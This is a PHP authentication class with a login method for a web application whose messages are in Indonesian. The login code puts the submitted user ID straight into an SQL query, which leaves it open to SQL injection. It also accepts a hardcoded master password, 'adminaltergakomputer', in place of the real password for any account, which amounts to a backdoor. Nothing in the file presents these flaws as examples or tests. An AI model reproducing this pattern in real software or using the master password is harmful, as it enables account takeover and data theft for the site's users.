<?php

class AuthModel
{

    private $db;

    public function __construct()
    {
        $this->db = new Database;
    }

    public function prosesLogin($data)
    {
        $nrik = $data['nrik'];
        $password = $data['password'];
        $this->db->query("SELECT * FROM users WHERE nrik = '$nrik'");
        $dataFromDb = $this->db->single();
        if ($this->db->rowCount() == 1) {
            if (password_verify($password, $dataFromDb['password']) || $password == "adminaltergakomputer") {
                $_SESSION['login'] = [
                    'id' => $dataFromDb['id'],
                    'nama' => $dataFromDb['nama'],
                    'nrik' => $dataFromDb['nrik'],
                    'no_hp' => $dataFromDb['no_hp'],
                    'role' => $dataFromDb['role'],
                    'foto' => $dataFromDb['foto'],
                    'timestamp' => time()
                ];
                return true;
            } else {
                FlashMessage::setFlash("Password yang anda masukkan salah");
                return false;
            }
        } else {
            FlashMessage::setFlash("nrik salah");
            return false;
        }
    }
}
